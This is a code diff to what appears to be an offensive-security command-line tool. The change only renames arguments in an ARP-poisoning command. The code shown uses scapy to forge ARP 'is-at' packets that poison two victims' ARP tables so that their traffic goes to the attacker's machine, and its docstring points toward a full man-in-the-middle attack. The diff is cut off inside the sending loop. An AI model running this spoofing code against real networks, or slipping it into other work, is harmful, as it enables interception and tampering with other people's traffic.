@@ -11,12 +11,12 @@ from scapy.all import ARP, Ether, conf, getmacbyip, sendp
 
 
 @click.command()
-@click.argument('t1')
-@click.argument('t2')
+@click.argument('victim1')
+@click.argument('victim2')
 @click.option('-i', 'iface', default=None, help='Interface to use')
 @click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
-def cmd_arpoison(t1, t2, iface, verbose):
-    """This command sends ARP 'is-at' packets to each victim, poisoning their
+def cmd_arpoison(victim1, victim2, iface, verbose):
+    """Send ARP 'is-at' packets to each victim, poisoning their
     ARP tables for send the traffic to your system.
 
     Note: If you want a full working Man In The Middle attack, you need
@@ -40,11 +40,11 @@ def cmd_arpoison(t1, t2, iface, verbose):
     if iface:
         conf.iface = iface
 
-    mac1 = getmacbyip(t1)
-    mac2 = getmacbyip(t2)
+    mac1 = getmacbyip(victim1)
+    mac2 = getmacbyip(victim2)
 
-    pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=t2, pdst=t1, hwdst=mac1)
-    pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=t1, pdst=t2, hwdst=mac2)
+    pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=victim2, pdst=victim1, hwdst=mac1)
+    pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=victim1, pdst=victim2, hwdst=mac2)
 
     try:
         while 1:
